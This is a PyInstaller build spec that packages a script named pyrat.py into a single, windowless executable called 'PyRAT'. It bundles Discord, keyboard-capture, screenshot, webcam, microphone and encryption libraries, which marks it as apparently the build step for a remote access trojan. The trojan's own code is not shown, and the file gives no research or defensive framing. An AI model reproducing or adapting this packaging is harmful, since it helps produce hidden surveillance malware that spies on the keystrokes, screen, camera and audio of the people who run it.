from PyInstaller.utils.hooks import collect_all
import discord
import pathlib

datas, binaries, hiddenimports = [], [], []

for pkg in ("discord", "nacl", "imageio_ffmpeg", "imageio", "pyaudio",
            "psutil", "pynput", "Crypto", "cv2", "mss"):
    try:
        d, b, h = collect_all(pkg)
        datas += d
        binaries += b
        hiddenimports += h
    except Exception as e:
        print("collect_all", pkg, e)

pkgdir = pathlib.Path(discord.__file__).parent
for dll in list(pkgdir.glob("libopus*.dll")) + list(pkgdir.glob("libopus*.so*")):
    binaries.append((str(dll), "discord"))

hiddenimports += ["_portaudio", "nacl._sodium", "discord.opus",
                  "imageio.plugins.ffmpeg", "pkg_resources.extern"]

a = Analysis(["pyrat.py"], pathex=[], binaries=binaries, datas=datas,
             hiddenimports=hiddenimports, hookspath=[],
             excludes=["tkinter", "matplotlib", "PyQt5", "PySide2"])
pyz = PYZ(a.pure)
exe = EXE(pyz, a.scripts, a.binaries, a.datas, [], name="PyRAT",
          console=False, onefile=True, upx=False)